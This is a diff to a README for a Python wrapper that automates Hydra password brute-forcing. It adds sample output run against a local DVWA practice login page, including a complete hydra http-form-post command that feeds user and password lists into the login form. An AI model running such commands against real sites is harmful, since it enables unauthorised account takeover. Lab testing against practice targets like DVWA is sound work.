@@ -7,3 +7,13 @@ The program is a wrapper so it requires hydra and of course Python to be preinst
 
 Run the program on the command line 
 > Python HydraAutomation.py URLOrIPAddress
+
+The output will be printed in command interface and should look like this when run against 'http://localhost/DVWA-1.0.8/login.php' :
+>--------------------------------------------
+>HYDRA COMMAND AUTOMATER RESULTS:
+>"login.php:
+>username=^USER^
+>password=^PASS^
+>:Login failed"
+>
+>hydra http://localhost/DVWA-1.0.8/login.php http-form-post "login.php:username=^USER^&password=^PASS^:Login failed" -L user.txt -P >pass.txt -t 10
